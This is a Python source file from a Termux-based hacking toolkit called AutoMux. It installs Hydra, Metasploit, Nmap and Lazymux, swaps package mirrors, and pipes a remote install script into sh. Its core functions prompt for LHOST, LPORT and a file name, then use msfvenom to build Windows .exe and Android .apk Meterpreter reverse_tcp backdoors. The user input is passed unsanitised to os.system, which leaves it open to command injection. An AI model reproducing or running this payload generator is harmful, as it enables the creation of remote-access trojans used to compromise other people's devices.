## MTcore.py 是Muxtools实现功能文件
# -*- coding: utf-8 -*-

import os, sys
from time import sleep as timeout
from termcolor import colored 

AM_banner =  """
               _        __  __            
    /\        | |      |  \/  |           
   /  \  _   _| |_ ___ | \  / |_   ___  __
  / /\ \| | | | __/ _ \| |\/| | | | \ \/ /
 / ____ \ |_| | || (_) | |  | | |_| |>  < 
/_/    \_\__,_|\__\___/|_|  |_|\__,_/_/\_\\

"""                                       

def banner():
    print(colored(AM_banner,"blue"))
    print(colored("Tips.后面带有","blue") + colored("「Root」","red") + colored("标识的需要手机","blue")+colored("有Root权限!!!","red"))
    print(colored("Tips.    输入update可查看如何更新程序\n","blue"))

def restart():
	python = sys.executable
	os.execl(python, python, * sys.argv)
	curdir = os.getcwd()

def okay():
    print(colored("\n安装成功！2秒后重启AutoMux\n","green"))
    timeout(2)
    restart()
    
def install_lazymux():
    print(colored("安装Lazymux中，请稍后...","green"))
    os.system("git clone https://github.com/Gameye98/Lazymux.git")
    okay()

def install_Hydra():
    print(colored("安装Hydra中，请稍后...","green"))
    os.system("apt install hydra -y")
    okay()

def qhd():
    print(colored("更换清华源中，请稍后...","green"))
    os.system("rm -rf $PREFIX/etc/apt/sources.list")
    os.system('echo "deb https://mirrors.tuna.tsinghua.edu.cn/termux stable main" >$PREFIX/etc/apt/sources.list')
    os.system("apt update")
    print(colored("更换成功！2秒后重启AutoMux","green"))
    timeout(2)
    restart()

def gfy():
    print(colored("更换官方源中，请稍后...","green"))
    os.system("rm -rf $PREFIX/etc/apt/sources.list")
    os.system('echo "deb https://termux.org/packages/ stable main" >$PREFIX/etc/apt/sources.list')
    os.system("apt  update")
    print(colored("更换成功！2秒后重启AutoMux","green"))
    timeout(2)
    restart()

def install_msf():
    print(colored("安装msf中，请稍候...","green"))
    os.system("apt install unstable-repo -y")
    os.system("apt install metasploit -y")
    okay()

def install_nmap():
    print(colored("安装Nmap中，请稍候...","green"))
    os.system("apt install nmap -y")
    okay()

def repair_msf():
    print(colored("修复msf数据库中，请稍候...","green"))
    os.system("pg_ctl -D $PREFIX/var/lib/postgresql -l logfile start")   
    print(colored("修复成功！2秒后重启AutoMux","green"))
    timeout(2)
    restart()

def install_zsh():
    print(colored("安装zsh中，请稍候...","green"))
    os.system('sh -c "$(curl -fsSL https://github.com/Cabbagec/termux-ohmyzsh/raw/master/install.sh )"')
    okay()

def WindouwsMM():
    LHOST = input(colored("请输入本机IP地址 >>> ","green"))
    LPORT = input(colored("请输入要监听的端口 >>> ","green"))
    exenmap = input(colored("请输入文件名字(.exe) >>> ","green"))
    bcml = input(colored("请输入保存地址 >>> ","green"))
    print(colored("正在为Windouws生成LHOST为: %s LPORT为: %s 的 %s文件...","yellow") %(LHOST,LPORT,exenmap))
    os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe > %s/%s" % (LHOST,LPORT,bcml,exenmap))
    print(colored("生成完毕!2秒后重启程序","yellow"))
    timeout(2)
    restart()

def AndroidMM():
    LHOST = input(colored("请输入本机IP地址 >>> ","green"))
    LPORT = input(colored("请输入要监听的端口 >>> ","green"))
    exenmap = input(colored("请输入文件名字(.apk) >>> ","green"))
    bcml = input(colored("请输入保存地址 >>> ","green"))
    print(colored("正在为Android生成LHOST为: %s LPORT为: %s 的 %s文件...","yellow") %(LHOST,LPORT,exenmap))
    os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=%s LPORT=%s R > %s/%s" %(LHOST,LPORT,bcml,exenmap))
    print(colored("生成完毕!2秒后重启程序","yellow"))
    timeout(2)
    restart()

def msf_mm():
    print(colored("\n请选择运行系统:\n","blue"))
    print("    [01]  Windows")
    print("    [02]  Android\n")
    print("    [00]  返回主菜单\n")
    OS = input(colored("AutoMux >>> ","yellow"))
    if OS.strip() == "1" or OS.strip() == "01":WindouwsMM()
    elif OS.strip() == "2" or OS.strip() == "02":AndroidMM()
    elif OS.strip() == "0" or OS.strip() == "00":restart()
    else:
        print(colored("\n输入错误，请重新输入！\n","red"))
        timeout(2)
        restart()


        


